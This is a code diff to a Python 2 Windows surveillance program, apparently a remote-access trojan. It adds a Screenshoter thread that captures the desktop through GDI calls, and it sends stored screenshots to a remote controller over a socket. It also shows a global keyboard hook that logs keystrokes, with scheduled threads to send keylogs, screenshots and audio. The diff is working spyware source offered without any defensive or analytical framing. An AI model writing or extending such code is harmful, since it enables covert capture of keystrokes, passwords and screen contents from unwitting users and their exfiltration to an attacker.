@@ -12,6 +12,7 @@ from ctypes.wintypes import MSG
 import threading
 import subprocess
 import sched
+import datetime
 
 HOST = '127.0.0.1'
 PORT = 4434
@@ -31,6 +32,8 @@ os_user = os.path.expanduser('~').split('\\')[-1]
 KEY_LOGS = {}
 SCREENSHOT_LOGS = {}
 AUDIO_LOGS = {}
+
+GLOBAL_SOCKET = None
 
 uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
 
@@ -58,6 +61,38 @@ Shell32 = ctypes.windll.shell32
 Gdi32 = ctypes.windll.gdi32
 Psapi = ctypes.windll.psapi
 
+# Init Screen Variables
+hDesktopWnd = User32.GetDesktopWindow()
+left = User32.GetSystemMetrics(76)
+top = User32.GetSystemMetrics(77)
+right = User32.GetSystemMetrics(78)
+bottom = User32.GetSystemMetrics(79)
+width = right - left
+height = bottom - top
+
+class BITMAPINFOHEADER(ctypes.Structure):
+    _fields_ = [
+        ('biSize', ctypes.c_uint32),
+        ('biWidth', ctypes.c_int),
+        ('biHeight', ctypes.c_int),
+        ('biPlanes', ctypes.c_short),
+        ('biBitCount', ctypes.c_short),
+        ('biCompression', ctypes.c_uint32),
+        ('biSizeimage', ctypes.c_uint32),
+        ('biXPelsPerMeter', ctypes.c_long),
+        ('biYPelsPerMeter', ctypes.c_long),
+        ('biClrUsed', ctypes.c_uint32),
+        ('biClrImportant', ctypes.c_uint32)]
+
+
+class BITMAPINFO(ctypes.Structure):
+    _fields_ = [
+        ('bmiHeader', BITMAPINFOHEADER),
+        ('bmiColors', ctypes.c_ulong * 3)]
+
+bmp_info = BITMAPINFO()
+
+
 # Init Processes Variables
 EnumProcesses = Psapi.EnumProcesses
 EnumProcesses.restype = ctypes.wintypes.BOOL
@@ -72,6 +107,7 @@ MAX_PATH = 260
 PROCESS_TERMINATE = 0x0001
 PROCESS_QUERY_INFORMATION = 0x0400
 
+
 def init():
     if os.path.exists('info.nfo'):
         variables = open('info.nfo', 'r').read()
@@ -84,30 +120,58 @@ def init():
             'ats': False,
             'at': 30,
             'sts': False,
+            'std': 20,
             'st': 30,
         }
         open('info.nfo', 'w').write(str(variables))
         return variables
 
+
+def screen_bits():
+    h_desktop_dc = User32.GetWindowDC(hDesktopWnd)
+    h_capture_dc = Gdi32.CreateCompatibleDC(h_desktop_dc)
+    h_capture_bitmap = Gdi32.CreateCompatibleBitmap(h_desktop_dc, width, height)
+    Gdi32.SelectObject(h_capture_dc, h_capture_bitmap)
+    Gdi32.BitBlt(h_capture_dc, 0, 0, width, height, h_desktop_dc, left, top, 0x00CC0020)
+    hdc = User32.GetDC(None)
+    bmp_info.bmiHeader.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+    dib_rgb_colors = 0
+    Gdi32.GetDIBits(hdc, h_capture_bitmap, 0, 0, None, ctypes.byref(bmp_info), dib_rgb_colors)
+    bmp_info.bmiHeader.biSizeimage = int(
+            bmp_info.bmiHeader.biWidth * abs(bmp_info.bmiHeader.biHeight) * (bmp_info.bmiHeader.biBitCount + 7) / 8)
+    p_buf = ctypes.create_unicode_buffer(bmp_info.bmiHeader.biSizeimage)
+    Gdi32.GetBitmapBits(h_capture_bitmap, bmp_info.bmiHeader.biSizeimage, p_buf)
+    return p_buf
+
+
 # TODO: Keylogger, Scheduler
 def send_keylog():
+    global GLOBAL_SOCKET
+    global ACTIVE
     global KEY_LOGS
 
     config = init()
     if config['kts'] and len(KEY_LOGS) > 0:
-        print KEY_LOGS
-        KEY_LOGS = {}
+        pass
     key_scheduler = sched.scheduler(time.time, time.sleep)
     key_scheduler.enter(config['kt'], 1, send_keylog, ())
     key_scheduler.run()
 
+
 def send_screenshot():
+    global GLOBAL_SOCKET
+    global ACTIVE
+    global SCREENSHOT_LOGS
+
     config = init()
-    if config['sts'] and len(SCREENSHOT_LOGS) > 0:
-        print 'SENT SCREENSHOTS'
+    if config['sts'] and len(SCREENSHOT_LOGS) > 0 and ACTIVE:
+        for i in SCREENSHOT_LOGS:
+            data_send(GLOBAL_SOCKET, str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
+        SCREENSHOT_LOGS = {}
     screen_scheduler = sched.scheduler(time.time, time.sleep)
     screen_scheduler.enter(config['st'], 1, send_screenshot, ())
     screen_scheduler.run()
+
 
 def send_audio():
     config = init()
@@ -117,6 +181,7 @@ def send_audio():
     audio_scheduler.enter(config['at'], 1, send_audio, ())
     audio_scheduler.run()
 
+
 def run_scheduler():
     key_thread = threading.Thread(target=send_keylog)
     key_thread.start()
@@ -124,32 +189,6 @@ def run_scheduler():
     screen_thread.start()
     audio_thread = threading.Thread(target=send_audio)
     audio_thread.start()
-
-shiftcodes = {
-    49: '!', 50: '@', 51: '#', 52: '$', 53: '%',
-    54: '^', 55: '&', 56: '*', 57: '(', 48: ')',
-    189: '_', 187: '+', 219: '{', 221: '}', 220: '|',
-    186: ':', 222: '"', 188: '<', 190: '>', 191: '?',
-}
-keycodes = {
-    160: '', 161: '', 32: '{{space}}',
-    9: '{{tab}}', 8: '{{del}}', 162: '', 163: '', 144: '',
-    35: '', 34: '', 33: '', 36: '', 45: '', 145: '', 19: '', 13: '{{newline}}'
-}
-updateCode = {
-    189: '-', 187: '=', 219: '[', 221: ']', 220: '\\',
-    186: ';', 222: '\'', 188: ',', 190: '.', 191: '/',
-    96: '0', 97: '1', 98: '2', 99: '3', 100: '4',
-    101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
-    111: '/', 106: '*', 109: '-', 107: '+',
-    110: '.'
-}
-
-def update_key(k):
-    if updateCode.has_key(k):
-        return updateCode[k]
-    else:
-        return str(chr(k))
 
 
 def get_fptr(fn):
@@ -192,10 +231,6 @@ class Key(threading.Thread):
         if w_param is not 0x0100:
             return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
 
-        print User32.GetKeyState(0x14) & 1
-        print User32.GetKeyState(0x10) & 0x8000
-        print l_param[0]
-
         self.write_key((User32.GetKeyState(0x14) & 1, User32.GetKeyState(0x10) & 0x8000, l_param[0]))
 
         return User32.CallNextHookEx(self.keyLogger.hooked, n_code, w_param, l_param)
@@ -212,10 +247,33 @@ class Key(threading.Thread):
         self.start_keylogger()
 
 
+# Screen Shots
+class Screenshoter(threading.Thread):
+
+    def run(self):
+
+        while 1:
+            config = init()
+            if config['sts']:
+                delay = config['std']
+                SCREENSHOT_LOGS[datetime.datetime.now()] = {
+                    'screen_bits': screen_bits(),
+                    'width': width,
+                    'height': height,
+                    'date': datetime.datetime.now(),
+                }
+
+                time.sleep(delay)
+            else:
+                break
+
+
 # TODO: TEMP
 run_scheduler()
 keylogger = Key()
 keylogger.start()
+screenshoter = Screenshoter()
+screenshoter.start()
 
 
 def check_info():
@@ -344,6 +402,7 @@ def reactor():
     global ACTIVE
     global UNLOCKED
     global ID
+    global GLOBAL_SOCKET
 
     while 1:
         try:
@@ -353,6 +412,8 @@ def reactor():
         except:
             time.sleep(5)
             continue
+
+        GLOBAL_SOCKET = server_socket
 
         while ACTIVE:
             try:
